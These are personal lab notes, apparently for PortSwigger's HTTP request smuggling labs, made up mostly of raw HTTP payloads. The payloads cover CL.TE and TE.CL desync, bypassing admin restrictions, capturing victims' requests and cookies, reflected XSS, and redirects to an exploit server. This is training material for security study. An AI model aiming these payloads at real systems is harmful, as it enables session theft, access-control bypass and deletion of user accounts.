### HTTP request smuggling, basic CL.TE vulnerability

In the home page request, change the request method to POST, and add the "Transfer-Encoding: chunked" header. 

After that, leave a space, put a 0 (to indicate the request termination based on the TE header), leave a space, and input the letter G, to smuggle it. 

Once you've done that, your request should look like this:
```text
POST / HTTP/1.1
Host: 0af200610381a197805cc27b00300017.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Referer: https://portswigger.net/
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
G
```

So, you are smuggling the letter G, and then the 2nd request will be the original POST, with the G appended. Resulting in a GPOST request method. 

---
### HTTP request smuggling, basic TE.CL vulnerability

In this case **EXPAND ON THIS PLEASE!!!!!**, as the server is paying attention to the TE header, you'll need to smuggle an entire GPOST request, and end that with a 0. Otherwise, you will smuggle something wrong. This should be the body, with the explanation:
```text
POST / HTTP/1.1
Host: 0a6a00dc0440ca538089e58800cf005a.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Referer: https://portswigger.net/
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4     ---> This is getting the body of your first request.
Transfer-Encoding: chunked
\r\n
5c\r\n                ---> This line is 4 bytes long (5,c,\r,\n). Corresponding to the first CL of 4
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15    ---> Here you can specify whatever length you want, I think this is not important. Shouldn't be too long
\r\n
x=1\r\n
0\r\n                 ---> This \r\n 
\r\n                  ---> and this \r\n are NECESARY to specify the request is terminated there, so the TE header of the beginning knows here ends the request!!
```

If you select ALL the text, from the x=1 INCLUDED, and you go until the first byte of the 2nd request (G from GPOST), you will see this length is 0x5c. This is the value you are specifying in the body of the first request! 

---
### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

To identify this is a CL.TE vulnerability, you can send a request like this one:
First, <u>uncheck the "Update Content-Length" option</u>
```text
POST / HTTP/1.1
Host: 0aa700f60438b4318157f227007b00d5.web-security-academy.net
Cookie: session=t4Rd2cyvcRYzbtbqzOwlTVzsyYqF7hTm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
a\r\n

```

After that check, you can send this request:
<u>Remember update the content length</u>
```text
POST / HTTP/1.1
Host: 0aa700f60438b4318157f227007b00d5.web-security-academy.net
Cookie: session=t4Rd2cyvcRYzbtbqzOwlTVzsyYqF7hTm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /AAAA HTTP/1.1
X-Ignore: x
```

The second time you send this request, should be 404 Not Found

---
### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

Let's validate with our SECOND REQUEST, (see it here, [[0. BSCP]])
And we see it responds with a Server Error: Communication timed out, so we know for sure it's a TE.CL vulnerability!

Let's build our payload:
```text
POST / HTTP/1.1
Host: 0adc00c303c05f19864be054004b0075.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4      ---> 4 is the size of (3,9,\r,\n)
Transfer-Encoding: chunked
\r\n
39\r\n                 ---> 39 is the size in hex for all the request, from the G to the 1
GET /404 HTTP/1.1
X-Ignore: x
Content-Length: 15     ---> Specify an according CL size
\r\n
x=1\r\n
0\r\n
\r\n                   ---> End the second request based on the TE header

```

---
### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

"Path /admin is blocked"

Let's send our FIRST REQUEST [[0. BSCP]] to test what kind of vuln is this. And we see it's a CL.TE.
Prepare 2 requests in the repeater, one the attacker, and the other one is a normal GET request to the home page, to check if we are successfully smuggling our requests.

Now let's build our attacker request:

```text
POST / HTTP/1.1
Host: 0a8b006704b0786d814fdf7b000f00d9.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Length: 37
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
X-Ignore: X
```

Now you'll see with your normal request, you have:
![[Pasted image 20240519164506.png]]

So, let's try to specify a new Host in our smuggled request:
```text
POST / HTTP/1.1
Host: 0a8b006704b0786d814fdf7b000f00d9.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Length: 37
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: localhost
```

And we get: 
![[Pasted image 20240519164616.png]]

Then, by adding a Content-Length greater by 1 of our payload body and the Content-Type equal to the original headers to our request, we get this:
```text
POST / HTTP/1.1
Host: 0a8b006704b0786d814fdf7b000f00d9.web-security-academy.net
Content-Length: 115
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3                 ---> (x=) = 2 bytes, so we add one to append it to the server

x=

NOTE: No \r\n at the end in this cases!!!

```

And we access the admin panel. So now, we set the endpoint at `/admin/delete?username=carlos` and that's it.

---
### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

Test with second one and you get "Read timeout"
By doing a /admin with a normal request, we get "/admin path is blocked" 

Let's send this request:
```text
POST / HTTP/1.1
Host: 0aed003903fc339c83c00af100f500bc.web-security-academy.net
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 4    ---> (6,0,\r,\n  = 4 bytes)
\r\n
60\r\n               ---> From P to 1 = 60 in hex
POST /admin HTTP/1.1
Content-Length: 15
Content-Type: application/x-www-form-urlencoded
\r\n
x=1
0\r\n
\r\n

```

Send the home GET request and you have the same error about the local users, so let's use the "Host: localhost".
The request is the same, but with that header added and the content length modified to 71.

Now you see the admin panel, modify the request to delete Carlos account!

---
### Exploiting HTTP request smuggling to reveal front-end request rewriting

we send our first test request and responds with a timed out. So it's CL.TE

We send this request: 
```text
POST / HTTP/1.1
Host: 0a2b000704bd63a88121662200fe0024.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

And it says unauthorized. Only available if requested from 127.0.0.1

OK, this one it's tricky. You'll need to get a response, so you can tell which header is adding. To do so, you will use this request:
```text
POST / HTTP/1.1
Host: 0a2b000704bd63a88121662200fe0024.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

So you are telling it to use a 200 content-lenght, and there is where our response text will appear.
After sending a GET request, you'll see:
![[Pasted image 20240519201124.png]]
And that is your header: X-uCcQPp-Ip
Let's use it now on our previous request, and you can access the admin panel. Now, you only need to delete Carlos account!

---
### Exploiting HTTP request smuggling to capture other users' requests
After sending the first test request, it responds with a time out, so it seems to be a CL.TE vulnerability. Let's see. Yes, it was :P

For this, get the /post/comment request, set the "comment" parameter at the end, so you can append the victim's request. And then, add the POST / request, so you can craft your payload.
This is the final request:
```text
POST / HTTP/1.1
Host: 0a76007904790472803735a500090059.web-security-academy.net
Cookie: session=qAU3GDbaEGA1rVZ2y5GKjko9vT5IroKp
Content-Type: application/x-www-form-urlencoded
Content-Length: 253
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=qAU3GDbaEGA1rVZ2y5GKjko9vT5IroKp
Content-Type: application/x-www-form-urlencoded
Content-Length: 920            ---> Notice this. Must be a big number, since you want to be able to write the victim request.

csrf=j90sx8sAmyIwUgAnB34q2uDZ7nCseFAk&postId=4&name=test&email=test%40test.com&website=&comment=t
```

This is the output in the comment section:
![[Pasted image 20240519204640.png]]

---
### Exploiting HTTP request smuggling to deliver reflected XSS

Based on the first request results, it's a CL.TE vulnerability, let's now try to build our payload.

The vulnerability here, is that it's reflecting the User Agent, so you need to escape that, and inject the script there. 
This is your request:
```text
POST / HTTP/1.1
Host: 0ae7008703a19a5d82238451006400f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

---
### Response queue poisoning via H2.TE request smuggling

Send this request 
```text
POST / HTTP/2
Host: 0afa005f042de263a611c2ac00900049.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 13

0

SMUGGLED
```
Send it twice, and the second time you'll receive a 404 error

You now need to send this request, and wait for around 5 seconds (the time window for the "victim" user to generate a request, and if you send this request again, should see the response of the victim. In this case, a 302, with the admin cookies)

Send a request to /admin/delete?username=carlos, and delete Carlos account.

---
### H2.CL request smuggling

Send this request twice, and should get a 404

```text
POST / HTTP/2
Host: 0abb006e04b4cd5882c6d3ed0054003d.web-security-academy.net
Content-Length: 0

SMUGGLED
```

There is an endpoint /resources, that generates a redirect. So, in the exploit server, change your file name to /resources

And the body is: `alert(document.cookie)`

This is your final payload
```text
POST / HTTP/2
Host: 0abb006e04b4cd5882c6d3ed0054003d.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0ac400a30486cd7f82b7d26b01940041.exploit-server.net
Content-Length: 5

x=1
```

---
### HTTP/2 request smuggling via CRLF injection

Use the search function a few times and observe it records your recent history. Send the most recent POST to repeater

In the inspector "request headers" add the header "foo":"bar\r\n" and add as body in the new interface 
```text
0

SMUGGLED
```
 and see every 2nd request, you get a 404. Change the body to:
 ```text
 0

POST / HTTP/1.1
Host: 0ac400e8036dcc5583fd7373002f00af.web-security-academy.net
Cookie: session=U823iLxOWfIibg39U7RekrUnuwrHwO2L
Content-Length: 900

search=x
 ```
Send the request once, and then refresh the web on the browser. Try to timing it, or at least give a few seconds, because you want to intercept the victim's request. You should see an entire GET request with the cookie.

Send a GET to the / with the stolen cookies, and the lab is solved.

---
### HTTP/2 request splitting via CRLF injection

Send a GET / request to repeater. switch to HTTP/2
Add a new header "foo":"`bar\r\n \r\n GET /x HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net`"

Send the request a few times with some seconds in between, until you intercept the 302 with admin session cookie.

Delete carlos account /admin/delete?username=carlos with that cookie

---
### CL.0 request smuggling

If you try to go to the admin panel, you see "Path /admin is blocked"

Create a tab group with two posts to GET /

First one, is this:
```text
POST /resources/images/blog.svg HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net 
Cookie: session=YOUR-SESSION-COOKIE 
Connection: keep-alive 
Content-Length: CORRECT 

GET /admin/delete?username=carlos HTTP/1.1 
Foo: x
```

Second one is just a normal GET to /
**Send group in sequence (single connection)**

---
### HTTP request smuggling, obfuscating the TE header

This is a TE.CL one. Send a GPOST request, but try to obfuscate the Transfer-Encoding header. You can do it in several ways, you can see it here [[0. BSCP]]. But now we'll use this:
```text
POST / HTTP/1.1
Host: 0acc00e40481739c804eb26400590084.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: abc         ---> double TE header

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n
\r\n
```


---
